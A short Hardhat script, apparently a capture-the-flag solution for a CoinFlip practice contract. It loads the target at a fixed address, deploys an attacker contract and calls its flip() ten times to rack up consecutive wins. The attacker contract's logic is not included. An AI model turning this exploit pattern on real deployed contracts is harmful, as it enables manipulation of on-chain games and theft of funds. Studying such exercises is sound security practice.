const { ethers } = require("hardhat");

const originalContractName = "CoinFlip";
const attackerContractName = "CoinFlip_Attacker";
const originalContractAddress = "0xC0B4C12D73910378bbed712E50fC988d0F12576C";

async function main() {
    let tx;
    // Load the Original Contract
    const factory = await ethers.getContractFactory(originalContractName);
    const contract = factory.attach(originalContractAddress);
    console.log("Loaded the Original Coin Flip contract");

    console.log("Consecutive Wins Before Attack Flip: ", await contract.consecutiveWins());

    // Deploy the Attacker Contract
    const attackerFactory = await ethers.getContractFactory(attackerContractName);
    const attackerContract = await attackerFactory.deploy(await contract.getAddress());
    await attackerContract.waitForDeployment();
    console.log("Deployed new Contract at:", await attackerContract.getAddress());

    console.log("Attacking the Original Contract using Attacker Contract");
    for (let i = 1; i <= 10; i++) {
        console.log(`Performing Attack#${i}...`);
        tx = await attackerContract.flip();
        await tx.wait(1);
    }

    console.log("Consecutive Wins After Attack Flip: ", await contract.consecutiveWins());
}

main().catch(error => {
    console.error(error);
    process.exit(1);
});
